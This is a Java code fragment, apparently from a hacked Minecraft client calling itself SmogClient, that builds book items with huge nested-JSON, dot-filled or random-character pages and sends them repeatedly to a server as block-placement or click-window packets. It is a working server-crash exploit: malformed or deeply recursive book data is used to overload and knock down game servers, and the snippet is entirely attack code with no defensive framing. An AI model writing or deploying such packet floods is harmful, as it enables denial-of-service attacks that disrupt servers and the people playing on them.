char[] letters = new char[]{'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'r', 's', 't', 'u', 'v', 'w', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0'};
            
for (int i = 0; i < packets; i++) {

NBTTagCompound comp = new NBTTagCompound();
NBTTagList list = new NBTTagList();
StringBuilder content = new StringBuilder();

switch (contentType){
    case "JSON":
        content.append("{").append("extra:[{".repeat(size)).append("text:L}],".repeat(size)).append("text:L}");
        break;
    case "POINT":
        content.append(".".repeat(size));
        break;
    case "RANDOM":
        for (int j = 0; j < size; j++) content.append(letters[random.nextInt(letters.length - 1)]);
        break;
}

list.appendTag(new NBTTagString(content.toString()));

comp.setString("author", "SmogClient");
comp.setString("title", "SmogBot");
comp.setByte("resolved", (byte) 1);
comp.setTag("pages", list);

ItemStack stack = new ItemStack(itemType.equalsIgnoreCase("WRITABLE_BOOK") ? Items.writable_book : Items.written_book);
stack.setTagCompound(comp);

switch(packetType){
    case "BPLACE":
        mc.getNetHandler().getNetworkManager().sendPacket(new C08PacketPlayerBlockPlacement(mc.thePlayer.getPosition(), 0, stack, 0, 0, 0));
        break;
    case "CLICK":
        mc.getNetHandler().getNetworkManager().sendPacket(new C0EPacketClickWindow(0, 2, 0, 0, stack, (short) 1));
        break;
}